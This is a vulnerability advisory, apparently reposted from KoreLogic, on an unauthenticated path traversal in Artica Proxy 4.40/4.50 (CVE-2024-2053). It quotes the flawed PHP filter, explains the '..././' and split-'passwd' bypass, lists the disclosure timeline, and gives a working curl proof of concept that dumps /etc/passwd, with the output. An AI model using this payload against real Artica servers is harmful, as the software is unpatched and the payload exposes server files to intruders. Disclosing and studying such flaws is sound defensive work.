@@ -1,0 +1,191 @@
+id: 39426
+date: 03/06/2024
+title: Artica Proxy 4.40 / 4.50 Local File Inclusion / Traversal Vulnerability
+author: Jim Becher
+cves: CVE-2024-2053
+
+Title: Artica Proxy Unauthenticated LFI Protection Bypass Vulnerability
+Advisory ID: KL-001-2024-001
+Publication Date: 2024.03.05
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-001.txt
+
+
+1. Vulnerability Details
+
+      Affected Vendor: Artica
+      Affected Product: Artica Proxy
+      Affected Version: 4.40 and 4.50
+      Platform: Debian 10 LTS
+      CWE Classification: CWE-23: Relative Path Traversal
+      CVE ID: CVE-2024-2053
+
+
+2. Vulnerability Description
+
+      The Artica Proxy administrative web application attempts to
+      prevent local file inclusion. These protections can be bypassed
+      and arbitrary file requests supplied by unauthenticated
+      users will be returned according to the privileges of the
+      "www-data" user.
+
+
+3. Technical Description
+
+      Prior to authentication, a user can send an HTTP request to
+      the "images.listener.php" endpoint. This endpoint processes
+      the "mailattach" query parameter and concatonates the user
+      supplied value to the "/opt/artica/share/www/attachments/"
+      file path. The contents of the file located at the newly
+      created path is returned in the HTTP response body.
+
+      The "images.listener.php" endpoint attempts to prevent
+      a local file inclusion vulnerability by stripping strings
+      that attempt to traverse into the parent directory from
+      the user supplied "mailattach" value:
+
+$_GET["mailattach"]=str_replace("////","/",$_GET["mailattach"]);
+$_GET["mailattach"]=str_replace("///","/",$_GET["mailattach"]);
+$_GET["mailattach"]=str_replace("//","/",$_GET["mailattach"]);
+$_GET["mailattach"]=str_replace("../","",$_GET["mailattach"]);
+$_GET["mailattach"]=str_replace("/etc/","",$_GET["mailattach"]);
+$_GET["mailattach"]=str_replace("passwd","",$_GET["mailattach"]);
+$file="/opt/artica/share/www/attachments/{$_GET["mailattach"]}";
+        header("Content-type: application/force-download" );
+        header("Content-Disposition: attachment; \
+                filename=\"{$_GET["mailattach"]}\"");
+        header("Content-Length: ".filesize($file)."" );
+        header("Expires: 0" );
+        readfile($file);
+
+      If effective, this approach would limit files
+      accessible by this endpoint to those within the
+      "/opt/artica/share/www/attachments/" directory. Unfortunately,
+      the removal of the "../" string is only performed once, so
+      the resulting file path is not checked.  By using the path
+      "..././foo.txt", the "images.listener.php" endpoint removes the
+      "../" string resulting in "../foo.txt" - a relative file path
+      to traverse to the parent directory.
+
+      The strings "/etc/" and "passwd" are also stripped from the file
+      path as many methods of detecting a path traversal vulnerability
+      rely on fetching the "/etc/passwd" file. By inserting these
+      strings into specific locations, a user suppplied "mailattach"
+      value such as "/epasswdtc/ppasswdasswd" is transformed into
+      "/etc/passwd", bypassing the protection entirely.
+
+      An unauthenticated user can leverage this endpoint to read
+      files on the system, according to the privileges of the
+      "www-data" user.
+
+
+4. Mitigation and Remediation Recommendation
+
+      No response from vendor; no remediation available.
+
+
+5. Credit
+
+      This vulnerability was discovered by Jaggar Henry of KoreLogic,
+      Inc.
+
+
+6. Disclosure Timeline
+
+      2023.12.18 - KoreLogic requests vulnerability contact and
+                   secure communication method from Artica.
+      2023.12.18 - Artica Support issues automated ticket #1703011342
+                   promising follow-up from a human.
+      2024.01.10 - KoreLogic again requests vulnerability contact and
+                   secure communication method from Artica.
+      2024.01.10 - KoreLogic mail daemon receives SMTP 554 5.7.1 from
+                   mail.articatech.com with response
+                   "Client host rejected: Go Away!"
+      2024.01.11 - KoreLogic requests vulnerability contact and
+                   secure communication method via
+                   https://www.articatech.com/ 'Contact Us' web form.
+      2024.01.23 - KoreLogic requests CVE from MITRE.
+      2024.01.23 - MITRE issues automated ticket #1591692 promising
+                   follow-up from a human.
+      2024.02.01 - 30 business days have elapsed since KoreLogic
+                   attempted to contact the vendor.
+      2024.02.06 - KoreLogic requests update on CVE from MITRE.
+      2024.02.15 - KoreLogic requests update on CVE from MITRE.
+      2024.02.22 - KoreLogic reaches out to alternate CNA for
+                   CVE identifiers.
+      2024.02.26 - 45 business days have elapsed since KoreLogic
+                   attempted to contact the vendor.
+      2024.02.29 - Vulnerability details presented to AHA!
+                   (takeonme.org) by proxy.
+      2024.03.01 - AHA! issues CVE-2024-2053 to track this
+                   vulnerability.
+      2024.03.05 - KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+      $ curl -k 
+'https://192.168.2.129:9000/images.listener.php?uri=1&mailattach=..././..././..././..././..././epasswdtc/ppasswdasswd'
+      root:x:0:0:root:/root:/bin/bash
+      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+      bin:x:2:2:bin:/bin:/usr/sbin/nologin
+      sys:x:3:3:sys:/dev:/usr/sbin/nologin
+      sync:x:4:65534:sync:/bin:/bin/sync
+      games:x:5:60:games:/usr/games:/usr/sbin/nologin
+      man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+      mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+      uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+      proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+      backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+      list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+      irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+      gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+      nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+      _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+      systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+      systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+      systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+      messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+      mysql:x:105:112:MySQL Server,,,:/nonexistent:/bin/false
+      quagga:x:106:114:Quagga routing suite,,,:/run/quagga/:/usr/sbin/nologin
+      apt-mirror:x:107:115::/var/spool/apt-mirror:/bin/sh
+      privoxy:x:108:65534::/etc/privoxy:/usr/sbin/nologin
+      ntp:x:109:117::/nonexistent:/usr/sbin/nologin
+      redsocks:x:110:118::/var/run/redsocks:/usr/sbin/nologin
+      prads:x:111:120::/home/prads:/usr/sbin/nologin
+      freerad:x:112:121::/etc/freeradius:/usr/sbin/nologin
+      vnstat:x:113:122:vnstat daemon,,,:/var/lib/vnstat:/usr/sbin/nologin
+      stunnel4:x:114:123::/var/run/stunnel4:/usr/sbin/nologin
+      sshd:x:115:65534::/run/sshd:/usr/sbin/nologin
+      vde2-net:x:116:124::/var/run/vde2:/usr/sbin/nologin
+      memcache:x:117:125:Memcached,,,:/nonexistent:/bin/false
+      davfs2:x:118:126::/var/cache/davfs2:/usr/sbin/nologin
+      ziproxy:x:119:127::/var/run/ziproxy:/usr/sbin/nologin
+      proftpd:x:120:65534::/run/proftpd:/usr/sbin/nologin
+      ftp:x:121:65534::/srv/ftp:/usr/sbin/nologin
+      mosquitto:x:122:128::/var/lib/mosquitto:/usr/sbin/nologin
+      openldap:x:123:129:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
+      munin:x:124:130:munin application user,,,:/var/lib/munin:/usr/sbin/nologin
+      msmtp:x:125:131::/var/lib/msmtp:/usr/sbin/nologin
+      Debian-snmp:x:126:132::/var/lib/snmp:/bin/false
+      opendkim:x:127:133::/var/run/opendkim:/usr/sbin/nologin
+      avahi:x:128:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+      glances:x:129:135::/var/lib/glances:/usr/sbin/nologin
+ArticaStats:x:1000:1000:ArticaStats:/home/ArticaStats:/bin/bash
+      Debian-exim:x:130:138::/var/spool/exim4:/usr/sbin/nologin
+      smokeping:x:131:139:SmokePing daemon,,,:/var/lib/smokeping:/usr/sbin/nologin
+      debian-spamd:x:132:140::/var/lib/spamassassin:/bin/sh
+      netdata:x:1001:1002:netdata:/home/netdata:/bin/bash
+      postfix:x:1002:1001::/home/postfix:/bin/sh
+      ...
+      ...
+
+
+The contents of this advisory are copyright(c) 2024
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+#  0day.today [2024-03-15]  #
